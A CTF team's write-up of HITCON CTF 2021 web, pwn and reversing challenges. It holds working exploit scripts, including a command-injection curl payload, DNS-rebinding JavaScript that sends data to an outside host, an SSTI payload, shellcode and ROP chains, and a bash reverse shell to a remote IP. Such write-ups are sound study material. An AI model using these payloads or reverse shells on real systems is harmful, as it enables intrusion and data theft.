# HITCON CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20211203-hitconctf2021/) of this writeup.**


 - [HITCON CTF 2021](#hitcon-ctf-2021)
   - [Web](#web)
     - [One-Bit Man](#one-bit-man)
     - [W3rmup PHP](#w3rmup-php)
     - [Vulpixelize](#vulpixelize)
       - [Solution 1: DNS rebinding](#solution-1-dns-rebinding)
       - [Solution 2: iFrame resize](#solution-2-iframe-resize)
     - [Metamon-Verse](#metamon-verse)
     - [FBI WARNING](#fbi-warning)
   - [Pwn](#pwn)
     - [dtcaas](#dtcaas)
     - [uml](#uml)
     - [metatalk](#metatalk)
     - [chaos [sandbox]](#chaos-sandbox)
   - [Reverse](#reverse)
     - [cclemon](#cclemon)
     - [baba is game](#baba-is-game)
     - [mercy](#mercy)
   - [Crypto](#crypto)
     - [a little easy rsa](#a-little-easy-rsa)
     - [still not rsa](#still-not-rsa)
     - [so easy rsa](#so-easy-rsa)
     - [magic rsa](#magic-rsa)
     - [magic dlog](#magic-dlog)
   - [Misc](#misc)
     - [baba is misc](#baba-is-misc)


## Web

### One-Bit Man

In this challenge, we can flip a single **bit** in a Wordpress blog server. The objective is to get RCE of the server.

Intuitively, wordpress provides admin servers at `/wp-admin`, but in the source code it's disabled. The password hash is changed to a dummy value, and it would be difficult to just flip one single bit to bypass the authentication.

```php
# files/init.sql
382:INSERT INTO `wp_users` VALUES (1,'admin','$P$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','admin','admin@example.com','{BASE}','2021-11-21 15:58:50','',0,'admin');
```

However, if we cannot flip the schema, how about flip the authentication logic in the source code?

```bash
$ rg 'wp_check_password'
user.php
174:    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
```

We can simply negate the logic: luckily fliping one bit can make `!` (0x21) become ` ` (space, 0x20).

Therefore, we flip the specific one bit:

- `/var/www/html/wp-includes/user.php`
- 5389th byte
- flip 0 bit (LSB)

And any password will lead to successfully login.

Finally, install the [WPTerm](https://wordpress.org/plugins/wpterm/) plugin from the market to achieve RCE.

The flag is `hitcon{if your solution is l33t, please share it!}`.


### W3rmup PHP

Find a Norway proxy (I simply googled `norway proxy` and try each proxy to see if it works or not.), then

```bash=
curl -x http://146.59.199.43:80 'http://18.181.228.241/?mail=a|/readflag||@a.bc'
```

You can see [author's twitter](https://twitter.com/orange_8361/status/1467495104240062466) to get more details of this.

### Vulpixelize

#### Solution 1: DNS rebinding

Since the server does not check the `Host:` header, we can perform DNS rebinding on `0.0.0.0` and our server IP to exfitrate the flag.

You can read more about DNS rebinding in bookgin's blog: 
[Abusing DNS: Browser-based port scanning and DNS rebinding](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/).

Create a dns server that provides multiple answers:
```python=
#!/usr/bin/env python3
from dnslib.server import DNSServer, DNSLogger, DNSRecord, RR
import time
import sys

class TestResolver:
  def resolve(self,request,handler):
    q_name = str(request.q.get_qname())
    print('[<-] ' + q_name)
    reply = request.reply()
    reply.add_answer(*RR.fromZone(q_name + " 0 A 1.3.3.7")) # my server's ip
    reply.add_answer(*RR.fromZone(q_name + " 0 A 0.0.0.0"))
    return reply

logger = DNSLogger(prefix=False)
resolver = TestResolver()
server = DNSServer(resolver,port=53,address="0.0.0.0",logger=logger)
server.start_thread()
try:
  while True:
    time.sleep(1)
    sys.stderr.flush()
    sys.stdout.flush()
except KeyboardInterrupt:
  pass
finally:
  server.stop()
```

Then create a simple http server, which will exit immediately after processing one GET request:
```python=
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        msg = b"""
<script>
fetch('/flag').then(x=>x.text()).then(x=>location=`http://ginoah.tw?b=${btoa(x)}`).catch(x=>location=`http://ginoah.tw?b=${btoa(x)}`);
</script>
"""
        self._set_headers()
        self.wfile.write(msg)
        exit(0)

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == "__main__":
    port = 38888 # challenge's port
    run(addr='0.0.0.0', port=port)

```

#### Solution 2: iFrame resize

```html
<iframe src="http://127.0.0.1:8000/flag" width="3000px" height="3000px" style="transform: scale(12);transform-origin:1050px 300px;">
```



### Metamon-Verse

Create a gopher proxy:
```python=
import socket
import time
import urllib.parse
import requests
import sys
from bs4 import BeautifulSoup

HOST = '0.0.0.0'
PORT = int(sys.argv[1])
URL = sys.argv[2]
KEY = sys.argv[3]
VALUE = int(sys.argv[4])

RHOST = '54.250.88.37'
RPORT = 39590
auth = ('ctf', 'e2a0ba1d0a4b40d4')

def serve_request(conn, key='TIMEOUT', value=2):
  # Lets just wait until we can assume all the data was sent
  time.sleep(.1)
  data = conn.recv(8192)
  payload = '_' + urllib.parse.quote(data)
  url = f"gopher://{URL}/{payload}xx"
  print('url:', url)
  key, value = KEY, VALUE

  res = requests.post(f"http://{RHOST}:{RPORT}/", data = {"url": url, f"CURLOPT_{key}": value}, auth=auth)
  soup = BeautifulSoup(res.text, 'html.parser')
  msg = soup.find(id='msg')
  if not msg.a:
    print('\033[91mError: ',msg.text.strip(), '\033[0m')
    return
  href = msg.a.get('href')
  print('\033[92mGET:', href, '\033[0m')
  res = requests.get(f"http://{RHOST}:{RPORT}/{href}", auth=auth)
  print('\033[92m',i, f'{len(res.content)}:',  res.content, '\033[0m')
  conn.send(res.content)
  return

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((HOST, PORT))
  s.listen()
  while True:
    conn, addr = s.accept()
    with conn:
      print('\033[92mConnected by', addr, '\033[0m')
      serve_request(conn)
      print('\033[93mDisconnected by', addr, '\033[0m')
```

Then mount nfs.server:/data to create a soft link
```bash=
$ python proxy.py 111 127.0.0.1:111 TIMEOUT 1
$ python proxy.py 2049 127.0.0.1:2049 LOCALPORT 888

$ sudo mount -t nfs 127.0.0.1:/data ./mnt -o nolock,vers=4 -v
$ sudo ln -s /app/templates/index.html mnt/c80de072846457372faf9609e6bfd79c.jpg
```

Finally overwrite index.html to SSTI
```python=
#!/usr/bin/env python3
import requests
from hashlib import md5
from urllib.parse import quote
import struct
s = requests.session()


host = 'http://54.250.88.37:39590/'
s.auth = ('ctf', 'e2a0ba1d0a4b40d4')


'''
{{  request['application']['__globals__']['__builtins__']['__import__']('subprocess').check_output('/readflag') }}
'''

url = "http://<YOUR_URL>/"
h = md5('1.3.3.7'.encode() + url.encode()).hexdigest()
path = f'/static/images/{h}.jpg'
print(path)
print(s.get(host + path).text)

r = s.post(host, data=dict(url=url))
print(r.text)
```

Notes:

1. The NFS server requires the src port of the TCP connection to [be less than 1024](https://www.spinics.net/lists/linux-nfs/msg32356.html). Otherwise it will give permission error. Fortunately we can use PyCurl's option `LOCALPORT` to do this.
2. Initially, we are trying to SSRF and replay the NFS packet, but the NFS protocol is so complicated (e.g. file handle), so we then work on how to estblish a proxy to perform NFS operations.
3. I'm not sure whether NFS V3 makes a difference here. We use `rpcinfo -p localhost` with the gopher proxy to determine if remote supports V3 or V4. It turns out both are supported.
4. Appending 2-byte garbage `xx`  in gopher is intentional. Otherwise the gopher will simply hang and not return.

### FBI WARNING

We find a very closed source code at [GitHub](https://github.com/hametsu/futaba). It seems like there are a lot of variation of this source code, but the core logic is the same.

Here is the source code of generating the unique id:

```php=
 $c_pass = $pwd;
  $pass = ($pwd) ? substr(md5($pwd),2,8) : "*";
  $youbi = array('日','月','火','水','木','金','土');
  $yd = $youbi[gmdate("w", $time+9*60*60)] ;
  $now = gmdate("y/m/d",$time+9*60*60)."(".(string)$yd.")".gmdate("H:i",$time+9*60*60);
  if(DISP_ID){
    if($email&&DISP_ID==1){
      $now .= " ID:???";
    }else{
      $now.=" ID:".substr(crypt(md5($_SERVER["REMOTE_ADDR"].IDSEED.gmdate("Ymd", $time+9*60*60)),'id'),-8);
    }
  }
```

With the hint that the IP starts with `219.`, we can brute-force the IP address.

```php=
<?php
for ($x = 0; $x <= 255; $x++) {
  for ($y = 0; $y <= 255; $y++) {
    for ($s = 0; $s <= 255; $s++) {
        $IP = '219.'.$s.".".$x.".".$y;
        if (substr(crypt(md5($IP.'idの種20211203'),'id'), -8) == 'ueyUrcwA'){
          echo 'boooom!!!!! '.$IP;
          die();
        }
      }
    }
  }
?>
```

The flag is `hitcon{219.91.64.47}`.

## Pwn

### dtcaas

```python=
from pwn import *
from IO_FILE import *

###Util
def upload(data):
    size = len(data)
    r.sendlineafter('Size?\n',str(size))
    r.sendafter('Data?\n',data)

###Addr
free_hook_offset = 0x1eeb28
system_offset = 0x55410

###Exploit
r = remote('52.196.81.112',3154)

leak = '''
/dts-v1/;
/ {
    exp {
        leak = /incbin/("/proc/self/maps");    
    };

};
'''
upload(leak)
while True:
    res = r.recvline()
    if b'libc' in res:
        break
libc_base = int(res.split(b'-')[0],16)
print(hex(libc_base))

shell = '''
/dts-v1/;
/ {
    exp {
        setup = "123456789abcdef0123456789abcdef0123456789abcdef0";
        pwn = /incbin/("/proc/self/fd/0",0,4294967344);
    };
};
'''
upload(shell)

padding = b'a'*0x1b0
IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags=0xfbad2088,
                           buf_base=libc_base+free_hook_offset-0x10, buf_end=libc_base+free_hook_offset-0x10+0x100000000)
payload = padding+stream[:0x48]
r.send(payload)
sleep(1)
payload = p64(libc_base+free_hook_offset-0x8)+b'/bin/sh\x00'+p64(libc_base+system_offset)
r.send(payload)

r.interactive()
```

### uml

```python
from pwn import *
context.arch = "amd64"

r = remote("3.115.128.152", 3154)
def Read(size):
    r.sendlineafter("Choose one:","2")
    r.sendlineafter("Size?",str(size))
    r.recvline()
    r.recvline()
    return r.recvn(size)

def Write(data):
    r.sendlineafter("Choose one:","1")
    r.sendlineafter("Size?",str(len(data)))
    r.recvline()
    r.recvline()
    r.sendline(data)
r.sendlineafter("Name of note?","/../../../dev/mem")


for i in range(0x360):
    Read(0x1000)
    print(hex(i))

for i in range(0xd):
    Read(0x1000)
    print(hex(i))

Read(0x900+8*10)

sc = b"/home/uml/flag-6db0fa76a6b0".ljust(0x30,b"\x00")
sc += asm(f"""
mov rdi,0x6036D958
mov rsi,0x0
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,0
syscall
mov rax,1
mov rdi,1
mov rsi,rsp
mov rdx,0x100
syscall
l:
 jmp l
""")

payload = p64(0x6036D900+8*11+0x30)
payload += sc
Write(payload)
r.interactive()

```


### metatalk

```python
from pwn import *
import struct

HOST = "18.181.73.12"
PORT = 4869
#context.log_level = "error"

def create_header(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x04" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header

def create_nop(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x08" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header


def create_cmd(data):
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x08" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += struct.pack(">I", len(data)) # data offset
    dsi_header += struct.pack(">I", len(data))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += data
    return dsi_header


def leak(prefix):
    context.log_level = "error"
    global table,data
    for i in range(0,0x100):
        #print(i)
        r = remote("18.181.73.12",4869)
        r.recvline()
        s = process(r.recvline()[:-1].split())
        s.recvuntil(b"token: ")
        ans = s.recvline()[:-1]
        s.close()
        r.sendline(ans)
        r.send(create_header(b""))
        r.recvn(0x10)
        payload = b"\x00"*0x102270
        payload += prefix
        payload += p8(i)
        r.send(create_nop(payload))
        try:
            r.recvn(13,timeout=1)
            r.close()
            data+=p8(i)
            break
        except:
            r.close()  


rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

  
"""
for i in range(8):
    data += leak(data)
    
data += b"a"*0x20

for i in range(8):
    data += leak(data)
"""    

data = b'\x80\x02\x83\xb4\xea\x7f\x00\x00'+b"a"*0x20 + b"\x00\x81\xdb\x1f\x74\x32\x7f\x7b"


canary_data = data[0x28:0x30]
data = data[:0x8]


fsbase = u64(data)
canary = u64(canary_data)
setcontext = fsbase - 0xc610cb
buf = fsbase-0x102270
libc = fsbase - 0xcb3280
"""
0x00000000000215bf: pop rdi; ret;
0x0000000000130569: pop rdx; pop rsi; ret;
0x0000000000043ae8: pop rax; ret;
0x00000000000d2745: syscall; ret;
"""


context.log_level = 20
r = remote(HOST,PORT)
r.recvline()
s = process(r.recvline()[:-1].split())
s.recvuntil(b"token: ")
ans = s.recvline()[:-1]
s.close()
r.sendline(ans)

r.send(create_header(b""))
r.recvn(0x10)
context.arch = "amd64"

cmd = b'bash -c "bash > /dev/tcp/3.112.16.91/4444 0>&1"'
payload = b"/bin/sh\x00" + b"-c"+b"\x00"*6
payload += cmd.ljust(0x70,b"\x00")
payload += p64(buf)+p64(buf+8)+p64(buf+0x10)+p64(0)
payload = payload.ljust(0x100,b"\x00")

payload += flat(
buf+0x110,libc+0x0000000000043ae8,0x3b,
libc+0x00000000000215bf,buf,
libc+0x0000000000130569,0,buf+0x80,
libc+0x00000000000d2745

)
payload = payload.ljust(0x102270-88,b"\x00")
payload += p64(fsbase+0x38)
payload = payload.ljust(0x102270,b"\x00")
payload += p64(fsbase)*5+p64(canary)
payload += b"\x00"*8
payload += p64(rol(setcontext,0x11,64)) + p64(buf-0xa0+0x100)
r.send(create_cmd(payload))

r.close()

```


### chaos [sandbox]

main.c
```cpp
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>


int dev;
char *buf;
size_t fdaddr = 0;
struct __attribute__((__packed__)) Req {
    uint32_t op;
    uint32_t inp;
    uint32_t in_size;
    uint32_t key;
    uint32_t key_size;
    uint32_t out;
    uint32_t out_size;
};

#define CHAOS_ALLOCATE_BUFFER 1074317824
#define CHAOS_REQUEST 3223112192

#define check(x, msg) {if (!(x)) { puts(msg); return -1; }}

void dbg() { puts("> continue"); char c; read(0, &c, 1); }



int read_flag() {
    int ret;
    struct Req req = {
        .op = 6,
        .out = 0,
        .out_size = 128,

    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    //check(ret == 0, "req failed");
    //ret = req.out_size;
    puts(buf);

    return ret;
}


int create_key(int size) {
    int ret;
    struct Req req = {
        .op = 1,
        .key = 0,
        .key_size = size,
    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;

    return ret;
}

int free_key(int key_entry) {
    int ret;
    struct Req req = {
        .op = 0,
        .key_size = key_entry,
    };
    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;

    return ret;
}

int encrypt_buf(int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 2,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 128,
        .key_size = key_entry, // misuse this field for argument
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;


}

int decrypt_buf(int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 3,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 128,
        .key_size = key_entry, // misuse this field for argument
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;


}

int aes_enc(char* data, int key_entry, int size) {
    int ret;
    struct Req req = {
        .op = 4,
        .inp = 0,
        .in_size = size, // overflow if in_size < 32 and (in_size & 7) == 0
        .out = 0,
        .out_size = 256,
        .key_size = key_entry, // misuse this field for argument
    };

    for ( int i = 0; req.in_size > i; ++i )
        buf[i + req.inp] = data[i];

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;
    printf("ret = %llu, %016llx\n", ret, ret);


    for (int i=0; i<32; i++) {
        printf("%02x", (unsigned char) buf[i + req.out]);
        data[i] = buf[i + req.out];
    }
    puts("");
}

void print_regs() {
    int ret;
    struct Req req = {
        .op = 5,
        .out = 0,
        .out_size = 256,
        .inp = 0,
        .in_size = 256,
        .key = 0,
        .key_size = 256,
    };

    ret = ioctl(dev, CHAOS_REQUEST, &req);
    check(ret == 0, "req failed");
    ret = req.out_size;
    printf("ret = %llu, %016llx\n", ret, ret);

    uint64_t* u64buf = (uint64_t*) &buf[req.out];
    const char* rn[] = {"rax", "rbx", "rcx", "rdx", "rdi", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15", "rsp"};
    for (int i=0; i<15; i++) {
        printf("%3s: %016llx\n", rn[i], u64buf[i]);
    }
    fdaddr = u64buf[1] + 0x5090;
    puts("");
}
uint32_t pad[0x10];
char secret[0x20];
uint32_t keys[0x100];
int main() {
    int ret;
    dev = open("/dev/chaos", 2);
    check(dev >= 0, "GG1");

    ret = ioctl(dev, CHAOS_ALLOCATE_BUFFER, 0x2000);
    check(ret == 0, "GG2");

    buf = mmap(0LL, 0x2000, 2LL, 1LL, dev, 0LL);
    check(buf != MAP_FAILED, "GG3");
    puts("run\n");
    print_regs();
    
   
    for(int i=0;i<0x10;i++)
	    pad[i] = create_key(0x10);

    uint32_t key_entry = 0;
    size_t* ptr = buf;
    uint32_t base = create_key(0x20);
    ptr[3] = 0x1101; // overwrite unsortebin size
    encrypt_buf(base,0x20);
    memcpy(secret,buf,0x20);
    ptr[0xff8/8] = ptr[3];  //put remain data

    //memset(buf,'A',0x1000);
    //
    ptr[(0x100-0x20+0x8)/8] = 0x20;
    ptr[(0x100-0x20+0x8)/8-1] = 0x1100;

    free_key(create_key(0x30));
    keys[0] = create_key(0x1000);
    uint32_t target = create_key(0x100);
    keys[1] = create_key(0x1000);
    

    free_key(keys[0]);
    keys[0] = create_key(0x2000);
    free_key(keys[1]);
    keys[1] = create_key(0x1000-0x30);
    memcpy(buf,secret,0x20);
    
    decrypt_buf(base,0x18); //overflow 
    
    free_key(create_key(0x100));
    free_key(target); 
    create_key(0xe00);
    ptr[0xb0/8] = fdaddr;
    printf("%p\n",fdaddr);
    create_key(0x190);
     
    ptr[0] = 0;
    free_key(pad[0]);
    free_key(pad[1]);
    free_key(pad[2]);
    free_key(pad[3]);
    create_key(0x100); 
    memset(ptr,0x100,0);
    ptr[0] = 1;
    ptr[1] = 0;
    ptr[2] = 0x0000000000201000;
    ptr[3] = 0x0000000000002000;
    ptr[4] = 0x0000000000100000;
    ptr[5] = 0x0000000000100000;
    ptr[6] = 0x0000000010000000;
    ptr[7] = 0x0000000000100000;
    ptr[8] = 0x0000000000010000;
    ptr[9] = 0x0000000000000080;
/*
0x55555555f170: 0x0000000000000000      0x0000000000000000
0x55555555f180: 0x0000000000201000      0x0000000000002000
0x55555555f190: 0x0000000000100000      0x0000000000100000
0x55555555f1a0: 0x0000000010000000      0x0000000000100000
0x55555555f1b0: 0x0000000000010000      0x0000000000000080
0x55555555f1c0: 0x0000000000000000      0x0000000000000000
0x55555555f1d0: 0x0000000000000000      0x0000000000000000
0x55555555f1e0: 0x0000000000000000      0x0000000000000000
0x55555555f1f0: 0x0000000000000000      0x0000000000000000
0x55555555f200: 0x0000000000000000      0x0000000000000000
0x55555555f210: 0x0000000000000000      0x0000000000000000
0x55555555f220: 0x0000000000000000      0x0000000000000000
0x55555555f230: 0x0000000000000000      0x0000000000000000
0x55555555f240: 0x0000000000000000      0x0000000000000000
0x55555555f250: 0x0000000000000000      0x0000000000000000
0x55555555f260: 0x0000000000000000      0x0000000000000000
*/

    create_key(0x100); 
    /*
    */
    //read(0,&ret,4);
    read_flag();
    return 0;
}


```

firmware.s
```
.intel_syntax noprefix
.section .text
.globl _start
_start:
    push rsp
    push r15
    push r14
    push r13
    push r12
    push r11
    push r10
    push r9
    push r8
    push rsi
    push rdi
    push rdx
    push rcx
    push rbx
    push rax
    mov r11, rsp

    mov     rdx, ds:0x10048
    cmp     rdx, ds:0x10050

    mov     rax, ds:0x10020
    mov     rcx, ds:0x10010
    lea     ebx, [rcx+0x10000000]
    lea     rcx, [rax-1]
    add     rax, rax
    and     rcx, rdx
    dec     rax
    inc     rdx
    imul    rcx, 0x0D
    and     rax, rdx
    mov     ds:0x10048, rax
    add     rbx, rcx

    mov     eax, [rbx+5] # req
    lea     rbp, [rax+0x10000000] # req

    mov     r12d, [rbp+0x00] # op

    mov     esi, [rbp+0x04] # inp
    mov     edx, [rbp+0x08] # inpSZ
    lea     r13, [esi+0x10000000]

    mov     esi, [rbp+0x0C] # key
    mov     edx, [rbp+0x10] # keySZ
    lea     r14, [esi+0x10000000]

    mov     esi, [rbp+0x14] # out
    mov     edx, [rbp+0x18] # outSZ
    lea     r15, [esi+0x10000000]


dispatch:
    cmp r12d, 0
    je handler_0
    cmp r12d, 1
    je handler_1
    cmp r12d, 2
    je handler_2
    cmp r12d, 3
    je handler_3
    cmp r12d, 4
    je handler_4
    cmp r12d, 5
    je handler_5
    cmp r12d, 6
    je handler_6
    jnz default


handler_0:
    # syscall(0x0C8A05, 255, key_entry)
    # op
    mov     esi, 255

    # key_entry
    mov     rdx, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done

handler_1:
    # syscall(0x0C8A05, 254, key)
    # op
    mov     esi, 254

    # key
    mov     eax, [rbp + 0x10]
    mov     rdx, r14
    shl     rdx, 0x20
    or      rdx, rax

    mov     edi, 0x0C8A05
    call    syscall
    jmp done


handler_2:
    # syscall(0x0C8A05, 11, inp, out, key_entry)
    # op
    mov     esi, 11

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_3:
    # syscall(0x0C8A05, 12, inp, out, key_entry)
    # op
    mov     esi, 12

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_4:
    # syscall(0x0C8A05, 12, inp, out, key_entry)
    # op
    mov     esi, 3

    # inp
    mov     eax, [rbp + 0x08]
    mov     rdx, r13
    shl     rdx, 0x20
    or      rdx, rax

    # out
    mov     eax, [rbp + 0x18]
    mov     rcx, r15
    shl     rcx, 0x20
    or      rcx, rax

    # key_entry
    mov     r8, [rbp + 0x10]

    mov     edi, 0x0C8A05
    xor     eax, eax
    call    syscall
    jmp done


handler_5:
    mov     ecx, 120
    mov     rdi, r15
    mov     rsi, r11
    rep     movsb
    mov     rax, 42
    jmp done



handler_6:
    mov rdi,821756
    mov rsi,r15
    xor eax,eax
    call syscall
    mov rax,42 
    jmp done
    


default:
    mov rax, 42
    jmp done

done:
    mov     rdx, ds:0x10028
    mov     rcx, ds:0x10018
    mov     rsi, ds:0x10060
    lea     edi, [rcx+0x10000000]
    lea     rcx, [rdx-1]
    add     rdx, rdx
    and     rcx, rsi
    dec     rdx
    inc     rsi
    imul    rcx, 6
    and     rdx, rsi
    add     rcx, rdi
    mov     di, [rbx]
    mov     [rcx+2], eax
    mov     [rcx], di
    mov     ds:0x10060, rdx

exit:
    mov     esi, 0          
    mov     edi, 60
    xor     r9d, r9d
    xor     r8d, r8d
    xor     ecx, ecx
    xor     edx, edx
    xor     eax, eax
    call    syscall


syscall:
    mov     rax, rdi
    mov     rdi, rsi
    mov     rsi, rdx
    mov     rdx, rcx
    mov     r10, r8
    mov     r8, r9
    syscall
    ret

```

## Reverse

### cclemon

```c=
#include<stdio.h>
#include<stdlib.h>

unsigned int state = 0x4183139;
unsigned int *a;


unsigned int w(){
  state = state*0x133791+0x132b9d01;
  return state;
}

void s(unsigned int x,unsigned int y){
  unsigned int tmp;
  tmp = a[x];
  a[x] = a[y];
  a[y] = tmp;
  return;
}

void r(unsigned int x,unsigned int y){
  if(x>y){
    r(y,x);
    return;
  }
  while(x<y){
    s(x,y);
    x+=1;
    y-=1;
  }
  return;
}

void o(unsigned int x,unsigned int y,unsigned int val){
  if(x>y){
    o(y,x,val);
    return;
  }
  for(int i=x;i<=y;i++)
    a[i]^=val;
  return;
}

int main(){
  unsigned int A,B,C,D;
  a = malloc(200000*sizeof(unsigned int));
  if(a==NULL){puts("malloc failed"); exit(0);}
  for(int i=0;i<200000;i++)
    a[i] = w();
  for(int i=0;i<1000000;i++){
    if(i%10000==0) fprintf(stderr,"%d\n",i);
    A = w()%3;
    B = w()%200000;
    C = w()%200000;
    switch(A){
      case 0:
        r(B,C);
    break;
      case 1:
    s(B,C);
    break;
      case 2:
    D = w();
    o(B,C,D);
    break;
      default:
    puts("error");
    exit(0);
    }
  }
  unsigned long long int res;
  printf("n = [");
  for(int i=0;i<200000;i++){
    res = (unsigned long long int)a[i];
    res*=(unsigned int)(i+1);
    printf("%llu,",res);
  }
  puts("]\nprint(sum(n))");
  return 0;
}
    
```

### baba is game
This challenge is basically a slightly modified version of the game [Baba is you](https://en.wikipedia.org/wiki/Baba_Is_You).

BabaCLI takes map file as argument, outputs several rules. After checking it with IDA, we found out that the program takes 7 kinds of inputs: w, a, s, d, x, r, l (and ends otherwise). The BabaCLI basically do the following operations after every input:

```
switch(input) {
    case 'w':
        travels up if not blocked;
        check if any event happens;
        break;
    case 'a':
        travels left if not blocked;
        check if any event happens;
        break;
    case 's':
        travels down if not blocked;
        check if any event happens;
        break;
    case 'd':
        travels right if not blocked;
        check if any event happens;
        break;
    case 'x':
        undo last step;
        break;
    case 'r':
        print current rules;
        break;
    case 'l':
        break;
}
```
When I translate a solution for baba_is_you.txt (found using BabaGUI) to input for BabaCLI, BabaCLI outputs `win!`, so I assume that a solution for BabaGUI is also a solution for BabaCLI.

The server outputs the same rules as map.txt, so I tried solving `map.txt` using BabaGUI.

Here, I used a bug that when `JiJi has you` is a rule, we are able to control `JiJi` (this wasn't the intended solution according to the author). The steps are:
- Control `Baba` to create the rule `JiJi has you`
- Control `JiJi` and move `Baba` and `is` to create the rule `Baba is win` . 
- Move `JiJi` onto `Baba` to win the game.

The final payload: [payload.txt](https://github.com/paulhuangkm/hitcon_2021/blob/master/Baba_is_game/payload.txt)
> hitcon{th3_0r1g1n4l_m4p_1s_N9RV-FZU9}

### mercy

The architecture of the binary is cLEMENCy, which was build for the DEFCON 25. The cLEMENCy use **9 bits** as a byte and it's **Middle Endian**. To run the binary I simply use the [emulator](https://github.com/legitbs/cLEMENCy) from legitbs. The commands of the debugger are similar to WinDbg.

```
#./clemency-emu-debug -d 0 mercy.bin
No map file found
Loading perplexity.bin
R00: 0000000	R01: 0000000	R02: 0000000	R03: 0000000
R04: 0000000	R05: 0000000	R06: 0000000	R07: 0000000
R08: 0000000	R09: 0000000	R10: 0000000	R11: 0000000
R12: 0000000	R13: 0000000	R14: 0000000	R15: 0000000
R16: 0000000	R17: 0000000	R18: 0000000	R19: 0000000
R20: 0000000	R21: 0000000	R22: 0000000	R23: 0000000
R24: 0000000	R25: 0000000	R26: 0000000	R27: 0000000
R28: 0000000	 ST: 0000000	 RA: 0000000	 PC: 0000000
 FL: 0000000

0000000:                         2b0402000002b8  ldt    R01, [R00 + 0x57, 3]
> 
```

Obviously, the emulator also offers a build-in disassembler, but somehow I didn't notice that.... So I upgraded the [IDA processor module developed by the HITCON](https://github.com/david942j/defcon-2017-tools) to make it work on IDA Pro 7.6, you can find the upgraded script on my [gist](https://gist.github.com/terrynini/36d560ad61cbec449e731f0e00dcea7d)

Run the binary and it output something like this:
```
# ./clemency-emu mercy.bin
'�@Connected IP: 0.0.0.0
Total instructions: 32027, 7.6767m instructions/sec
Running time: 0.004172 seconds, sleep time: 0.000000 seconds
```

Looks like something broke? Bytes before `Connected IP: 0.0.0.0` are actually `2713 c140`, the 9-bit byte version of `NO\n`.

By tracing the output, I knew that:

1. The binary prints `Nice job: %s` or `NO`
2. Function at address `476A` is printf
3. Base on 2. the function at address `5EBF` is flag verifier

Reading the assembly, the algorithm implmented at `5EBF` is something like RC4. (But I couldn't recover the flag by simply replacing the input with "cipher")

```python
#1. generate sbox 
#2. swap elements in sbox based on key at 0x6b33
#   the key is [12b,062,0bc,09c,03b,034,111,089,144]
#3. "Encrypt" the input string at 0x4010000 as following

i = 0
j = 0
for r1 in range(0x1b):
	i = sbox[r1] + i
	sbox[r1], sbox[i] = sbox[i], sbox[r1]
	temp = sbox[i] +  sbox[r1]
	r8 = sbox[temp]^flag_buf[r1]
	output[r1] = r8 + j
	j = output[r1]
```

